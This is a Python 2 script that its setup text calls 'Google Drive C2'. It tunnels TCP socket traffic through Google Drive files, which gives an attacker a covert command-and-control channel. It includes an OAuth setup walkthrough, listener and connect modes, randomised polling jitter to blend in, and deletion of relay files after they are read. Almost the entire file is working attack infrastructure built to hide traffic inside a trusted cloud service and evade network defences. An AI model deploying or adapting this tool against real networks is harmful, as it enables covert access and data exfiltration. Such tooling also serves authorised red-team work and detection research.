#!/usr/bin/env python
from optparse import OptionParser
from oauth2client.client import GoogleCredentials
from oauth2client import client
import sys
import base64
import subprocess
from subprocess import Popen, PIPE
from threading import Thread
from Queue import Queue, Empty
from datetime import datetime
from dateutil import parser
import signal
from time import sleep
import socket, select, SocketServer, struct, time, random
from apiclient import discovery
import apiclient
import httplib2
import io
from googleapiclient.http import BatchHttpRequest

# PASTE NEW CREDENTIALS HERE
def get_credential(index):
    credentials = []
    return credentials[index]

class ThreadingTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass

class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        while True:
            try:
                if self.request in select.select([self.request],[self.request],[self.request])[0]:
                    debug('selected self 1')
                    in_data1 = ""
                    while self.request in select.select([self.request],[self.request],[self.request])[0]:
                        debug('selected self 2')
                        in_data1 += self.request.recv(4096 * 4)
                        sleep(.01)
                    if len(in_data1)>0:
                        debug('SOCKET -> DRIVE')
                        write_data(service, send, in_data1)
                    else:
                        return
                in_data2 = read_data(service, recv)
                debug('read done')
                if len(in_data2)>0:
                    debug('DRIVE -> SOCKET')
                    self.request.send(in_data2)
                sleep(opts.poll + opts.poll*random.random()*opts.jitter)
            except Exception as e:
                print "Exception: ", e
                return

def setup():
    raw_input("""
Google Drive C2 Setup
---------------------

You'll need a Google Account to continue. You may
want to create a new Google Account for c2.

Create a New Project here:

https://console.developers.google.com/apis

[continue]""")
    raw_input("""
Create Credentials for your project.

Select OAuth Client ID Credentials of type "Other".

Click "Download JSON" and place the .json file in this directory.

It must be named "client_secrets.json"

[continue]""")
    #verbose("Creating flow object from client_secrets.json...")
    flow = client.flow_from_clientsecrets(
        "client_secrets.json",
        scope = [
            'https://www.googleapis.com/auth/drive',
            'https://spreadsheets.google.com/feeds/'
        ],
        redirect_uri='urn:ietf:wg:oauth:2.0:oob')
    auth_uri = flow.step1_get_authorize_url()
    print "\nOpen this URL in your browser: \n\n" + auth_uri + "\n"
    auth_code = raw_input('Enter the authentication code: ')
    #verbose("Retrieving full credentials...")
    credentials = flow.step2_exchange(auth_code)
    raw_input("""
Success! API Credentials Created!

Copy and Paste this code into the top of this python script to store this credential

credentials.append(GoogleCredentials(None,"%s","%s","%s",None,"https://accounts.google.com/o/oauth2/token",None))

When you run this script, you can specify which credentials to use via -c

[continue]
""" % (credentials.client_id, credentials.client_secret, credentials.refresh_token))
    raw_input("""

IMPORTANT PERFORMANCE TIP:

1. Create a second Drive API project
2. Run --setup again
3. Use one credential for each running script, avoiding rate limits

[continue]
""")
    print "\nSetup success!"
    exit()

def signal_handler(signal, frame):
    sys.exit()

def create_file(service, name, data):
    file_metadata = {
        'name' : str(name),
    }
    mbody = apiclient.http.MediaIoBaseUpload(
        io.BytesIO(data), mimetype='application/octet-stream')
    result = service.files().create(body=file_metadata,
        media_body=mbody).execute()
    return str(result['id'])

def clear_files(service, name1, name2):
    results = service.files().list(q='name="%s" or name="%s"' % (name1, name2)).execute()['files']
    batch = service.new_batch_http_request()
    for i in results:
        batch.add(service.files().delete(fileId=i['id']))
    batch.execute()

def read_data(service, recv):
    data = ""
    results = service.files().list(orderBy='createdTime', q=('name="' + str(recv) + '"'), pageSize=1000, fields="nextPageToken, files(id)").execute()['files']
    if results == []:
        return data
    batch = service.new_batch_http_request()
    for i in results:
        data += service.files().get_media(fileId=i['id']).execute()
        batch.add(service.files().delete(fileId=i['id']))
    batch.execute()
    return data

def write_data(service, send, data):
    file_metadata = {
        'name' : str(send),
    }
    mbody = apiclient.http.MediaIoBaseUpload(
        io.BytesIO(data), mimetype='application/octet-stream')
    service.files().create(body=file_metadata,
        media_body=mbody).execute()

def main():
    signal.signal(signal.SIGINT, signal_handler)
    parser = OptionParser(usage="usage: %prog [options]")
    parser.add_option("--setup",
                  action="store_true",
                  dest="setup",
                  default=False,
                  help="Setup script with Drive App")
    parser.add_option("-c",
                  action="store",
                  type=int,
                  dest="creds",
                  default=0,
                  help="Index of creds in credentials array to use (default: 0)")
    parser.add_option("-d",
                  action="store_true",
                  dest="d",
                  default=False,
                  help="Delete files with names provided to -s and -r")
    parser.add_option("-l",
                  action="store_true",
                  dest="listen",
                  default=False,
                  help="Enable Socket Mode: Listener")
    parser.add_option("-i",
                  action="store",
                  dest="ip",
                  default="",
                  help="Enable Socket Mode: Connect")
    parser.add_option("-p",
                  action="store",
                  type=int,
                  dest="port",
                  default=8000,
                  help="Port number for socket mode (default: 8000)")
    parser.add_option("-s",
                  action="store",
                  dest="send",
                  default='0',
                  help="Sending channel (default: 0)")
    parser.add_option("-r",
                  action="store",
                  dest="recv",
                  default='1',
                  help="Receiving channel (default: 1)")
    parser.add_option("-P",
		  action="store", 
                  type=float,
		  dest="poll",
		  default=0.0,
		  help="Poll every x seconds (default: 0)")
    parser.add_option("-j",
		  action="store", 
                  type=float,
		  dest="jitter",
		  default=1.0,
		  help="Amount of randomness in polling (default: 1.0)")
    parser.add_option("-v",
                  action="store_true",
                  dest="verbose",
                  default=False,
                  help="Enable verbose output")
    parser.add_option("--debug",
                  action="store_true",
                  dest="debug",
                  default=False,
                  help="Enable debug output")
    global opts
    (opts, args) = parser.parse_args()
    if len(sys.argv[1:]) == 0:
	parser.print_help()
        sys.exit()

    global verbose
    if opts.verbose:
        def verbose(o):
            print '\033[93m' + str(o) + '\033[0m'
    else:
        def verbose(o):
            pass

    global debug
    if opts.debug:
        def debug(o):
            print '\033[93m' + 'DEBUG: ' + str(o) + '\033[0m'
    else:
        def debug(o):
            pass

    verbose(opts)
    verbose(args)

    if opts.setup:
        print "Launching Setup..."
        setup()
    else:
        try:
            credentials = get_credential(opts.creds)
        except:
            print "Failed to get credentials at index %s!" % str(opts.creds)
            print "Run --setup to obtain credentials to add to this script."
            exit()

    try:
        verbose("Authenticating...")
        global service
        global http
        http = credentials.authorize(httplib2.Http())
        service = discovery.build('drive', 'v3', http=http)
    except:
        sys.exit("Auth failure!")

    verbose("Drive Authentication Successful.")

    if opts.d:
        verbose("Clearing files...")
        clear_files(service, opts.send, opts.recv)
        sys.exit("Files cleared.")

    global send
    global recv
    send = opts.send
    recv = opts.recv

    if opts.listen:
        server = ThreadingTCPServer(('', opts.port), ThreadedTCPRequestHandler)
        verbose('Server Started! Listening on %s...' % str(opts.port))
        try: 
            server.serve_forever() 
        except KeyboardInterrupt:
            verbose("Ctrl C - Stopping server")
            server.server_close()
            sys.exit(1)
    elif opts.ip:
        s = socket.socket()
        s.connect((opts.ip, opts.port))
        verbose('Connected to %s:%s...' % (opts.ip, str(opts.port)))
        while True:
            try:
                if s in select.select([s],[s],[s])[0]:
                    debug('s is selected 1')
                    in_data1 = ""
                    while s in select.select([s],[s],[s])[0]:
                        debug('s is selected 2')
                        in_data1 += s.recv(4096 * 4)
                        sleep(.01)
                    if len(in_data1)>0:
                        debug('SOCKET -> DRIVE')
                        write_data(service, send, in_data1)
                        debug('write done')
                    else:
                        exit()
                in_data2 = read_data(service, recv)
                debug('read done')
                if len(in_data2)>0:
                    debug('DRIVE -> SOCKET')
                    s.send(in_data2)
                sleep(opts.poll + opts.poll*random.random()*opts.jitter)
            except Exception as e:
                print "Exception: ", e
                return
    else:
        print 'Choose Listener Mode or Connect Mode!'

if __name__ == '__main__':
    main()
